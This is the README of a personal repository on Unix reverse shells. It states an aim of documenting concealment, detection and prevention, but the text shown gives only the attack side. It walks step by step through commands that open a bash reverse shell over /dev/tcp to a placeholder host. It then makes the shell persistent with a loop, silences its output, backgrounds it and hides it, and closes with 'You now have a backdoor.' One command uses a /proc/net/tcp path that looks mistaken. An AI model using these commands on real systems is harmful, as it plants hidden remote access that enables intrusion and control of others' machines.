# unix-reverse-shells
A knowledge base for reverse shells on Unix-like systems.

---

In my spare time I am fiddling with reverse shells **for Unix-like systems**.

This repository is to document my findings on:

- how they are typically concealed

- how we can detect this kind of activity on already compromised machines

- what can be done to prevent these from succeeding when an authenticated user plants one

### Intro
Creating your first reverse shell
is astonishingly simple.

1. Spawn a new shell on the target machine:
      ```sh
      bash
      ```

2. Listen for a connection on your machine:
      ```sh
      nc -lp <port>
      ```

3. Connect to that port from the target machine:
      ```sh
       bash -i >& /proc/net/tcp/<your-ip>/<port> 0>&1
      ```

Voila.

After playing with this for a while you're probably asking - how do we keep it alive?

4. While loop
      ```sh
      sh -c 'while true; do bash -i  >& /dev/tcp/<your-ip>/<port> 0>&1 | sh -i; done'
      ```

5. Supress the output
      ```sh
      sh -c 'while true; do bash -i  >& /dev/tcp/<your-ip>/<port> 0>&1 | sh -i; done > /dev/null 2>&1'
      ```

6. Throw it in the background
      ```sh
      sh -c 'while true; do bash -i  >& /dev/tcp/<your-ip>/<port> 0>&1 | sh -i; done > /dev/null 2>&1 &'
      ```

7. Hide the shell
      ```sh
      sh -c 'while true; do bash -i  >& /dev/tcp/<your-ip>/<port> 0>&1 | sh -i; done > /dev/null 2>&1 &' && exit > /dev/null 2>&1;
      ```
You now have a backdoor.
